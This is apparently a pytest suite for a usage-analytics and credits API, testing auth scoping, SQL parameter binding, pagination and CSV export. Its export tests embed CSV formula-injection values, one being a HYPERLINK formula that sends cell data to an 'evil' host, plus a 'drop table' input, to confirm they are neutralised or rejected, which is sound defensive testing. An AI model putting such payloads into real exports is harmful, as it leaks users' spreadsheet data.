"""
/credits/v2/** — AI usage History / Analytics read API (routers/credits_v2.py,
services/metering_query.py).

No database: routes run against a fake query layer (dependency override) or a
recording fake session that captures every SQL statement + its params. Real
HS256 tokens are minted with the configured secret; the platform-staff
allowlist is stubbed.

Covers: 401 without a token, 403 for another institute, non-admins limited to
their own events (asserted on the scope AND on the SQL/params), staff-only
vendor cost, export admin-only + CSV header + hard cap, filter -> SQL mapping,
IST bounds, pagination math, label rendering and the summary maths.
"""
from __future__ import annotations

import base64
import os
import sys
from contextlib import contextmanager
from datetime import date, datetime, timezone
from pathlib import Path
from types import SimpleNamespace

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))
os.environ.setdefault("OPENROUTER_API_KEY", "or-platform")

from fastapi import FastAPI  # noqa: E402
from fastapi.testclient import TestClient  # noqa: E402
from jose import jwt  # noqa: E402

from ai_service.app.config import get_settings  # noqa: E402
from ai_service.app.core import security  # noqa: E402
from ai_service.app.routers import credits_v2  # noqa: E402
from ai_service.app.services import metering_query as mq  # noqa: E402
from ai_service.app.db import db_dependency  # noqa: E402

INST_A = "11111111-1111-1111-1111-111111111111"
INST_B = "22222222-2222-2222-2222-222222222222"
USER_1 = "user-1"
OTHER = "user-2"
STAFF = "staff-id"

BASE = f"/credits/v2/institutes/{INST_A}"
ROUTES = [
    f"{BASE}/usage-config",
    f"{BASE}/usage-events",
    f"{BASE}/usage-summary",
    f"{BASE}/usage-events/export",
    f"/credits/v2/me/usage?institute_id={INST_A}",
]


def _token(authorities, user=USER_1, username="alice"):
    secret = get_settings().jwt_secret_key
    secret += "=" * (-len(secret) % 4)
    claims = {"sub": username, "username": username, "user": user, "is_root_user": True,
              "authorities": authorities}
    return "Bearer " + jwt.encode(claims, base64.b64decode(secret), algorithm="HS256")


def _hdr(inst=INST_A, roles=("STUDENT",), user=USER_1):
    return {"Authorization": _token({inst: {"roles": list(roles), "permissions": []}}, user=user)}


class FakeQuery:
    def __init__(self, ready=True):
        self.ready = ready
        self.calls = []

    def tables_ready(self):
        return self.ready

    def list_events(self, scope, filters, page, page_size):
        self.calls.append(("list", scope, filters, page, page_size))
        return {"items": [], "page": page, "page_size": page_size, "total": 0}

    def summary(self, scope, days, group_by, metric):
        self.calls.append(("summary", scope, days, group_by, metric))
        return mq.empty_summary(group_by, days, metric)

    def count_events(self, scope, filters):
        self.calls.append(("count", scope, filters))
        return 3


@pytest.fixture
def env(monkeypatch):
    real = get_settings()
    stub = SimpleNamespace(jwt_secret_key=real.jwt_secret_key, jwt_algorithm=real.jwt_algorithm,
                           super_admin_user_ids=STAFF, internal_service_token="svc")
    monkeypatch.setattr(security, "get_settings", lambda: stub)
    fake = FakeQuery()
    streamed = []

    def streamer(scope, filters, cap):
        streamed.append((scope, filters, cap))
        yield mq._csv_line(mq.csv_header(scope.include_cost))
        yield "row\n"

    app = FastAPI()
    app.include_router(credits_v2.router)
    app.dependency_overrides[db_dependency] = lambda: None
    app.dependency_overrides[credits_v2.get_metering_query] = lambda: fake
    app.dependency_overrides[credits_v2.get_export_streamer] = lambda: streamer
    monkeypatch.setattr(credits_v2, "history_v2_enabled", lambda iid, db=None: iid == INST_A)
    return SimpleNamespace(client=TestClient(app), fake=fake, streamed=streamed)


# ── auth ────────────────────────────────────────────────────────────────────

@pytest.mark.parametrize("url", ROUTES)
def test_no_token_is_401(env, url):
    assert env.client.get(url).status_code == 401


@pytest.mark.parametrize("url", ROUTES)
def test_member_of_another_institute_is_403(env, url):
    r = env.client.get(url, headers=_hdr(inst=INST_B, roles=("ADMIN",)))
    assert r.status_code == 403


def test_platform_staff_still_needs_membership(env):
    r = env.client.get(f"{BASE}/usage-events", headers=_hdr(inst=INST_B, roles=("ADMIN",), user=STAFF))
    assert r.status_code == 403


def test_usage_config(env):
    r = env.client.get(f"{BASE}/usage-config", headers=_hdr(roles=("TEACHER",)))
    assert r.status_code == 200
    assert r.json() == {"history_v2_enabled": True, "is_admin": False}
    r = env.client.get(f"{BASE}/usage-config", headers=_hdr(roles=("admin",)))
    assert r.json()["is_admin"] is True


def test_non_admin_is_scoped_to_own_events_even_when_asking_for_someone_else(env):
    r = env.client.get(f"{BASE}/usage-events?user_id={OTHER}", headers=_hdr(roles=("TEACHER",)))
    assert r.status_code == 200
    _, scope, filters, _, _ = env.fake.calls[-1]
    assert scope.institute_id == INST_A
    assert scope.actor_user_id == USER_1
    assert scope.include_cost is False
    assert filters.user_id == OTHER  # ANDed with the scope in SQL -> nothing


def test_admin_sees_institute_and_staff_sees_cost(env):
    env.client.get(f"{BASE}/usage-events", headers=_hdr(roles=("ADMIN",)))
    scope = env.fake.calls[-1][1]
    assert scope.actor_user_id is None and scope.include_cost is False
    env.client.get(f"{BASE}/usage-events", headers=_hdr(roles=("STUDENT",), user=STAFF))
    scope = env.fake.calls[-1][1]
    assert scope.actor_user_id is None and scope.include_cost is True


def test_summary_scoping_and_validation(env):
    h = _hdr(roles=("STUDENT",))
    r = env.client.get(f"{BASE}/usage-summary?days=7&group_by=role_class&metric=list", headers=h)
    assert r.status_code == 200
    kind, scope, days, group_by, metric = env.fake.calls[-1]
    assert (scope.actor_user_id, days, group_by, metric) == (USER_1, 7, "role_class", "list")
    assert env.client.get(f"{BASE}/usage-summary?days=8", headers=h).status_code == 422
    assert env.client.get(f"{BASE}/usage-summary?group_by=institute", headers=h).status_code == 422
    assert env.client.get(f"{BASE}/usage-summary?metric=cost", headers=h).status_code == 422


def test_me_usage_is_own_only_even_for_admin(env):
    r = env.client.get(f"/credits/v2/me/usage?institute_id={INST_A}&days=30", headers=_hdr(roles=("ADMIN",)))
    assert r.status_code == 200
    _, scope, days, group_by, metric = env.fake.calls[-1]
    assert scope.actor_user_id == USER_1 and group_by == "use_case" and metric == "charged"
    body = r.json()
    assert set(body) == {"group_by", "days", "metric", "total_credits", "total_events", "rows"}


def test_page_size_capped_and_filters_validated(env):
    h = _hdr(roles=("ADMIN",))
    assert env.client.get(f"{BASE}/usage-events?page_size=101", headers=h).status_code == 422
    assert env.client.get(f"{BASE}/usage-events?page=0", headers=h).status_code == 422
    assert env.client.get(f"{BASE}/usage-events?role_class=GOD", headers=h).status_code == 422
    assert env.client.get(f"{BASE}/usage-events?billing_mode=FREEBIE", headers=h).status_code == 422
    assert env.client.get(f"{BASE}/usage-events?surface=MOON", headers=h).status_code == 422
    assert env.client.get(f"{BASE}/usage-events?from=2026-10-05&to=2026-10-01", headers=h).status_code == 422
    r = env.client.get(f"{BASE}/usage-events?from=2026-10-01&to=2026-10-05&role_class=learner"
                       "&billing_mode=charged&surface=admin_app&min_credits=1.5&use_case=tutor_chat"
                       "&feature_group=tutor&page=2&page_size=50", headers=h)
    assert r.status_code == 200
    _, _, f, page, page_size = env.fake.calls[-1]
    assert (f.from_date, f.to_date) == (date(2026, 10, 1), date(2026, 10, 5))
    assert (f.role_class, f.billing_mode, f.surface) == ("LEARNER", "CHARGED", "ADMIN_APP")
    assert (f.min_credits, f.use_case, f.feature_group, page, page_size) == (1.5, "tutor_chat", "tutor", 2, 50)


def test_tables_missing_answers_empty(env):
    env.fake.ready = False
    h = _hdr(roles=("ADMIN",))
    assert env.client.get(f"{BASE}/usage-events", headers=h).json() == {
        "items": [], "page": 1, "page_size": 20, "total": 0}
    body = env.client.get(f"{BASE}/usage-summary", headers=h).json()
    assert body["rows"] == [] and body["total_events"] == 0


def test_export_admin_only(env):
    r = env.client.get(f"{BASE}/usage-events/export?format=csv", headers=_hdr(roles=("TEACHER",)))
    assert r.status_code == 403
    assert env.streamed == []
    r = env.client.get(f"{BASE}/usage-events/export?format=xlsx", headers=_hdr(roles=("ADMIN",)))
    assert r.status_code == 422


def test_export_streams_csv(env):
    r = env.client.get(f"{BASE}/usage-events/export?format=csv&use_case=tutor_chat", headers=_hdr(roles=("ADMIN",)))
    assert r.status_code == 200
    assert r.headers["content-type"].startswith("text/csv")
    assert "attachment" in r.headers["content-disposition"]
    assert r.headers["x-total-rows"] == "3" and r.headers["x-truncated"] == "false"
    first = r.text.splitlines()[0].split(",")
    assert first[:5] == ["id", "occurred_at_ist", "occurred_at_utc", "label", "use_case"]
    assert "real_cost_usd" not in first
    scope, filters, cap = env.streamed[-1]
    assert cap == mq.EXPORT_CAP == 100_000 and scope.actor_user_id is None and filters.use_case == "tutor_chat"


# ── history flag ────────────────────────────────────────────────────────────

def test_history_v2_enabled_reads_the_setting(monkeypatch):
    from ai_service.app.services import platform_settings_service as pss
    real = credits_v2.history_v2_enabled
    try:  # force the fallback reader (metering core missing / failing)
        from ai_service.app.services.metering import cache as core_cache

        def core_down(iid):
            raise RuntimeError("core down")
        monkeypatch.setattr(core_cache, "history_v2_enabled", core_down)
    except ImportError:
        core_cache = None
    for raw, inst, want in (([INST_A], INST_A, True), ([INST_A], INST_B, False), (["*"], INST_B, True),
                            ([], INST_A, False), (f'["{INST_A}"]', INST_A, True), ("", INST_A, False),
                            (None, INST_A, False)):
        monkeypatch.setattr(pss, "get_platform_setting", lambda k, d=None, db=None, raw=raw: raw)
        assert real(inst) is want, (raw, inst)

    def boom(*a, **k):
        raise KeyError("not registered")
    monkeypatch.setattr(pss, "get_platform_setting", boom)
    assert real(INST_A) is False

    if core_cache is not None:  # the core's reader wins when it works
        monkeypatch.setattr(core_cache, "history_v2_enabled", lambda iid: iid == INST_B)
        assert real(INST_B) is True and real(INST_A) is False


# ── SQL builders ────────────────────────────────────────────────────────────

def test_event_where_maps_every_filter_to_sql():
    f = mq.EventFilters(from_date=date(2026, 10, 1), to_date=date(2026, 10, 1), user_id="u9",
                        role_class="TEACHER", feature_group="tutor", use_case="tutor_chat",
                        billing_mode="FREE", surface="LEARNER_APP", min_credits=2)
    where, p = mq.build_event_where(mq.Scope(INST_A, actor_user_id=USER_1), f)
    for frag in ("e.institute_id = :institute_id", "e.actor_user_id = :scope_actor_user_id",
                 "e.occurred_at >= :from_ts", "e.occurred_at < :to_ts", "e.actor_user_id = :f_user_id",
                 "e.actor_role_class = :f_role_class", "e.feature_group = :f_feature_group",
                 "e.use_case = :f_use_case", "e.billing_mode = :f_billing_mode", "e.surface = :f_surface",
                 "e.credits_charged >= :f_min_credits"):
        assert frag in where
    assert p["institute_id"] == INST_A and p["scope_actor_user_id"] == USER_1 and p["f_user_id"] == "u9"
    # IST day: 2026-10-01 00:00 IST = 2026-09-30 18:30 UTC; 'to' is inclusive -> next IST midnight.
    assert p["from_ts"] == datetime(2026, 9, 30, 18, 30, tzinfo=timezone.utc)
    assert p["to_ts"] == datetime(2026, 10, 1, 18, 30, tzinfo=timezone.utc)
    # No input is ever interpolated into the SQL text.
    assert "u9" not in where and "tutor_chat" not in where


def test_event_where_admin_has_no_actor_filter_and_unknown_role_coalesces():
    where, p = mq.build_event_where(mq.Scope(INST_A), mq.EventFilters(role_class="UNKNOWN"))
    assert "scope_actor_user_id" not in where and "scope_actor_user_id" not in p
    assert "COALESCE(e.actor_role_class, 'UNKNOWN') = :f_role_class" in where


def test_ledger_rows_only_for_unfiltered_admin_views():
    assert mq.build_ledger_where(mq.Scope(INST_A, actor_user_id=USER_1), mq.EventFilters()) is None
    for kw in ("user_id", "role_class", "feature_group", "use_case", "billing_mode", "surface"):
        assert mq.build_ledger_where(mq.Scope(INST_A), mq.EventFilters(**{kw: "X"})) is None, kw
    where, p = mq.build_ledger_where(mq.Scope(INST_A), mq.EventFilters(from_date=date(2026, 10, 1), min_credits=5))
    assert "ct.institute_id = :institute_id" in where
    assert "ct.transaction_type <> 'USAGE_DEDUCTION'" in where and "ct.usage_event_id IS NULL" in where
    assert "ABS(ct.amount) >= :f_min_credits" in where
    # created_at is naive UTC.
    assert p["l_from_ts"] == datetime(2026, 9, 30, 18, 30) and p["l_from_ts"].tzinfo is None


def test_page_bounds_and_window_start():
    assert mq.page_bounds(1, 20) == (20, 0)
    assert mq.page_bounds(3, 20) == (20, 40)
    assert mq.page_bounds(0, 0) == (1, 0)
    now = datetime(2026, 10, 15, 20, 0, tzinfo=timezone.utc)  # 16 Oct 01:30 IST
    # last 7 IST days = 10..16 Oct -> 10 Oct 00:00 IST = 9 Oct 18:30 UTC
    assert mq.window_start(7, now) == datetime(2026, 10, 9, 18, 30, tzinfo=timezone.utc)


# ── the real MeteringQuery against a recording session ─────────────────────

class _R:
    def __init__(self, rows=None, scalar=None):
        self.rows = [SimpleNamespace(_mapping=r) for r in (rows or [])]
        self._scalar = scalar

    def fetchall(self):
        return self.rows

    def fetchone(self):
        return self.rows[0] if self.rows else None

    def scalar(self):
        return self._scalar


class RecordingDB:
    def __init__(self, responder):
        self.sql = []
        self.responder = responder

    def execute(self, clause, params=None):
        s = str(clause)
        self.sql.append((s, dict(params or {})))
        return self.responder(s, params or {})

    def rollback(self):
        pass


EV_ID = "aaaaaaaa-0000-0000-0000-000000000001"
LG_ID = "bbbbbbbb-0000-0000-0000-000000000002"
TX_ID = "cccccccc-0000-0000-0000-000000000003"


def _event_row(**kw):
    row = {"id": EV_ID, "occurred_at": datetime(2026, 10, 14, 10, 0, tzinfo=timezone.utc), "use_case": "tutor_chat",
           "feature_group": "tutor", "request_type": "conversation", "tool_key": None, "actor_kind": "USER",
           "actor_user_id": USER_1, "actor_display_name": "Ravi", "actor_role_class": "LEARNER",
           "subject_user_id": None, "subject_display_name": None, "surface": "LEARNER_APP",
           "model_id": "z-ai/glm-5.3-flash:batch", "prompt_tokens": 100, "completion_tokens": 50,
           "cached_read_tokens": None, "reasoning_tokens": 3, "image_count": 0, "seconds": None, "minutes": None,
           "characters": 0, "list_credits": 1.25, "credits_charged": 1.25, "refunded_credits": 0,
           "billing_mode": "CHARGED", "charge_status": "POSTED", "batch_id": None, "ledger_tx_id": TX_ID,
           "context": {"course_name": "=HYPERLINK()"}, "real_cost_usd": 0.0012, "balance_after": 98.75,
           "ledger_description": "conversation using z-ai/glm-5.3-flash"}
    row.update(kw)
    return row


def _responder(s, p):
    if "SELECT (SELECT COUNT(*)" in s or s.startswith("SELECT COUNT(*)"):
        return _R(scalar=2)
    if "UNION ALL" in s or ("'usage' AS kind" in s):
        return _R(rows=[{"kind": "usage", "id": EV_ID, "occurred_at": None},
                        {"kind": "ledger", "id": LG_ID, "occurred_at": None}])
    if "FROM ai_usage_event e LEFT JOIN credit_transactions" in s:
        return _R(rows=[_event_row()])
    if "FROM credit_transactions WHERE institute_id" in s:
        return _R(rows=[{"id": LG_ID, "created_at": datetime(2026, 10, 13, 9, 0), "transaction_type": "ADMIN_GRANT",
                         "amount": 500, "balance_after": 600, "description": "Top-up"}])
    if "FROM ai_use_case_catalog" in s:
        return _R(rows=[{"use_case": "tutor_chat", "feature_group": "tutor", "label": "AI tutor chat",
                         "label_template": None, "count_unit_label": "requests", "display_order": 1,
                         "is_active": True}])
    raise AssertionError(s)


@pytest.fixture
def fresh_catalog():
    mq.invalidate_catalog_cache()
    yield
    mq.invalidate_catalog_cache()


def test_list_events_admin_merges_ledger_and_keeps_tenant_filter(fresh_catalog, monkeypatch):
    monkeypatch.setattr(mq, "_core_render", lambda: None)
    db = RecordingDB(_responder)
    out = mq.MeteringQuery(db).list_events(mq.Scope(INST_A), mq.EventFilters(), page=3, page_size=20)
    assert out["page"] == 3 and out["page_size"] == 20 and out["total"] == 2
    assert [i["kind"] for i in out["items"]] == ["usage", "ledger"]
    page_sql, page_params = next((s, p) for s, p in db.sql if "UNION ALL" in s)
    assert "ORDER BY occurred_at DESC, id DESC LIMIT :limit OFFSET :offset" in page_sql
    assert (page_params["limit"], page_params["offset"]) == (20, 40)
    for s, p in db.sql:
        if "ai_usage_event" in s or "credit_transactions" in s:
            assert "institute_id = :institute_id" in s and p["institute_id"] == INST_A, s
    ev = out["items"][0]
    assert ev["label"] == "AI tutor chat" and ev["use_case_label"] == "AI tutor chat"
    assert ev["model_short"] == "glm-5.3-flash" and ev["actor_name"] == "Ravi"
    assert ev["balance_after"] == 98.75 and ev["ledger_tx_id"] == TX_ID
    assert ev["units"] == {"prompt_tokens": 100, "completion_tokens": 50, "cached_read_tokens": 0,
                           "image_count": 0, "seconds": 0.0, "minutes": 0.0, "characters": 0}
    assert "real_cost_usd" not in ev
    lg = out["items"][1]
    assert lg == {"kind": "ledger", "id": LG_ID, "occurred_at": "2026-10-13T09:00:00+00:00",
                  "transaction_type": "ADMIN_GRANT", "amount": 500.0, "balance_after": 600.0,
                  "description": "Top-up"}


def test_list_events_non_admin_sql_carries_actor_filter_everywhere(fresh_catalog, monkeypatch):
    monkeypatch.setattr(mq, "_core_render", lambda: None)
    db = RecordingDB(_responder)
    out = mq.MeteringQuery(db).list_events(mq.Scope(INST_A, actor_user_id=USER_1, include_cost=True),
                                           mq.EventFilters(), page=1, page_size=10)
    assert not any("UNION ALL" in s for s, _ in db.sql)  # no institute ledger rows for a non-admin
    event_sql = [(s, p) for s, p in db.sql if "ai_usage_event" in s]
    assert event_sql
    for s, p in event_sql:
        assert "e.actor_user_id = :scope_actor_user_id" in s and p["scope_actor_user_id"] == USER_1, s
    assert out["items"][0]["real_cost_usd"] == 0.0012  # staff scope


def test_summary_sql_and_maths(fresh_catalog):
    rows = [{"key": "tutor_chat", "label": None, "credits": 30, "events": 3},
            {"key": "lesson_video", "label": None, "credits": 10, "events": 1}]

    def responder(s, p):
        if "FROM ai_use_case_catalog" in s:
            return _responder(s, p)
        return _R(rows=rows)
    db = RecordingDB(responder)
    out = mq.MeteringQuery(db).summary(mq.Scope(INST_A, actor_user_id=USER_1), 30, "use_case", "charged")
    s, p = next((s, p) for s, p in db.sql if "GROUP BY 1" in s)
    assert "e.institute_id = :institute_id" in s and "e.actor_user_id = :scope_actor_user_id" in s
    assert "e.occurred_at >= :since" in s and "credits_charged" in s and "refunded_credits" in s
    assert out["total_credits"] == 40 and out["total_events"] == 4
    assert out["rows"][0] == {"key": "tutor_chat", "label": "AI tutor chat", "credits": 30.0, "events": 3,
                              "share_pct": 75.0}
    assert out["rows"][1]["label"] == "lesson_video"  # not in the catalog -> key

    db = RecordingDB(lambda s, p: _R(rows=[]))
    mq.MeteringQuery(db).summary(mq.Scope(INST_A), 7, "day", "list")
    s, _ = db.sql[-1]
    assert "AT TIME ZONE 'Asia/Kolkata'" in s and "list_credits" in s and "ORDER BY key ASC" in s
    with pytest.raises(ValueError):
        mq.MeteringQuery(db).summary(mq.Scope(INST_A), 7, "drop table", "list")


def test_summarize_labels():
    out = mq.summarize("user", 7, "charged", [{"key": "", "label": None, "credits": 0, "events": 2},
                                              {"key": "u1", "label": "Ravi", "credits": 0, "events": 1},
                                              {"key": "u2", "label": None, "credits": 0, "events": 1}], {})
    assert [r["label"] for r in out["rows"]] == ["System / unattributed", "Ravi", "u2"]
    assert all(r["share_pct"] == 0.0 for r in out["rows"])  # no division by zero
    assert mq.summarize("role_class", 7, "list", [{"key": "API_KEY", "credits": 1, "events": 1}], {})[
        "rows"][0]["label"] == "API key"
    assert mq.summarize("feature_group", 7, "list", [{"key": "kb", "credits": 1, "events": 1}], {})[
        "rows"][0]["label"] == "Knowledge base"
    assert mq.summarize("model", 7, "list", [{"key": "anthropic/claude-sonnet-5.5", "credits": 1, "events": 1}],
                        {})["rows"][0]["label"] == "claude-sonnet-5.5"


# ── labels ──────────────────────────────────────────────────────────────────

def test_render_label_uses_core_and_falls_back(monkeypatch):
    cat = {"use_case": "tutor_chat", "label": "AI tutor chat", "label_template": "{label} — {actor_name}"}
    ev = {"use_case": "tutor_chat", "actor_name": "Ravi", "description": "old text"}
    monkeypatch.setattr(mq, "_core_render", lambda: (lambda c, e: f"{c['label']} — {e['actor_name']}"))
    assert mq.render_label(cat, ev) == "AI tutor chat — Ravi"

    def broken(c, e):
        raise KeyError("x")
    monkeypatch.setattr(mq, "_core_render", lambda: broken)
    assert mq.render_label(cat, ev) == "AI tutor chat"
    monkeypatch.setattr(mq, "_core_render", lambda: (lambda c, e: ""))
    assert mq.render_label(cat, ev) == "AI tutor chat"
    monkeypatch.setattr(mq, "_core_render", lambda: None)
    # unknown / legacy rows show the old ledger description
    assert mq.render_label({"use_case": "unknown", "label": "Other AI usage"}, ev) == "old text"
    assert mq.render_label(None, {"use_case": "x"}) == "x"
    assert mq.render_label(None, {}) == "AI usage"


def test_label_row_passes_names_and_context():
    row = mq._event_label_row(_event_row(context='{"flow_name": "Admissions"}', minutes=4))
    assert row["actor_name"] == "Ravi" and row["context"] == {"flow_name": "Admissions"}
    assert row["description"] == "conversation using z-ai/glm-5.3-flash" and row["minutes"] == 4.0


# ── CSV export ──────────────────────────────────────────────────────────────

class _ExportQuery:
    def __init__(self, total):
        self.total = total
        self.afters = []

    def catalog(self):
        return {"tutor_chat": {"use_case": "tutor_chat", "label": "AI tutor chat"}}

    def export_batch(self, scope, filters, after, limit):
        self.afters.append((after, limit))
        start = 0 if after is None else int(after[1].split("-")[-1]) + 1
        n = max(0, min(limit, self.total - start))
        return [_event_row(id=f"e-{start + i}") for i in range(n)]


def _export(total, cap, batch, include_cost=False):
    q = _ExportQuery(total)
    sessions = []

    @contextmanager
    def session_factory():
        sessions.append(1)
        yield None
    chunks = list(mq.iter_export_csv(mq.Scope(INST_A, include_cost=include_cost), mq.EventFilters(), cap=cap,
                                     batch_size=batch, session_factory=session_factory,
                                     query_factory=lambda db: q))
    lines = "".join(chunks).splitlines()
    return lines, q, sessions


def test_export_header_rows_and_keyset():
    lines, q, sessions = _export(total=25, cap=1000, batch=10)
    assert lines[0].split(",") == list(mq.CSV_COLUMNS)
    assert len(lines) == 1 + 25
    assert q.afters[0] == (None, 10) and q.afters[1][0][1] == "e-9"
    assert len(sessions) == 3  # one short-lived session per batch
    row = next(__import__("csv").reader([lines[1]]))
    rec = dict(zip(mq.CSV_COLUMNS, row))
    assert rec["occurred_at_ist"] == "2026-10-14 15:30:00" and rec["occurred_at_utc"] == "2026-10-14 10:00:00"
    assert rec["label"] == "AI tutor chat" and rec["reasoning_tokens"] == "3"
    assert rec["context_json"] == '{"course_name": "=HYPERLINK()"}'  # JSON starts with '{': inert
    evil = mq.csv_row(_event_row(actor_display_name="=HYPERLINK(\"x\")", batch_id="+1"), {}, False)
    rec = dict(zip(mq.CSV_COLUMNS, evil))
    assert rec["actor_name"].startswith("'=") and rec["batch_id"] == "'+1"  # formulas neutralised
    # ids and enum-like cells are caller-supplied text too
    evil = mq.csv_row(_event_row(actor_user_id='=HYPERLINK("http://evil/?"&A1,"x")', subject_user_id="@SUM(1)",
                                 model_id="-2+3", use_case="=1"), {}, False)
    rec = dict(zip(mq.CSV_COLUMNS, evil))
    assert rec["actor_user_id"].startswith("'=") and rec["subject_user_id"] == "'@SUM(1)"
    assert rec["model_id"] == "'-2+3" and rec["use_case"] == "'=1"
    assert all(not str(v).startswith(("=", "+", "-", "@")) for v in evil if isinstance(v, str))


def test_export_hard_cap():
    lines, q, _ = _export(total=50, cap=30, batch=7)
    assert len(lines) == 1 + 30
    assert sum(limit for _, limit in q.afters) == 30
    lines, _, _ = _export(total=10, cap=10**9, batch=5)  # never above EXPORT_CAP
    assert len(lines) == 11
    assert mq.EXPORT_CAP == 100_000


def test_export_cost_column_only_for_staff():
    lines, _, _ = _export(total=1, cap=10, batch=5, include_cost=True)
    assert lines[0].split(",")[-1] == "real_cost_usd" and lines[1].split(",")[-1] == "0.0012"


def test_event_item_with_the_real_core_renderer():
    labels = pytest.importorskip("ai_service.app.services.metering.labels")
    assert mq._core_render() is labels.render_label
    cat = {"tutor_chat": {"use_case": "tutor_chat", "label": "AI tutor chat",
                          "label_template": "{label} — {actor_role_label} {actor_name}"},
           "learner_analytics": {"use_case": "learner_analytics", "label": "Learner insights",
                                 "label_template": "{label} — {subject_name}"},
           "unknown": {"use_case": "unknown", "label": "Other AI usage"}}
    assert mq.event_item(_event_row(), cat, False)["label"] == "AI tutor chat — student Ravi"
    # missing subject name: the segment and its separator are dropped cleanly
    row = _event_row(use_case="learner_analytics", subject_display_name=None)
    assert mq.event_item(row, cat, False)["label"] == "Learner insights"
    # unknown / legacy rows show the old ledger description
    row = _event_row(use_case="unknown")
    assert mq.event_item(row, cat, False)["label"] == "conversation using z-ai/glm-5.3-flash"
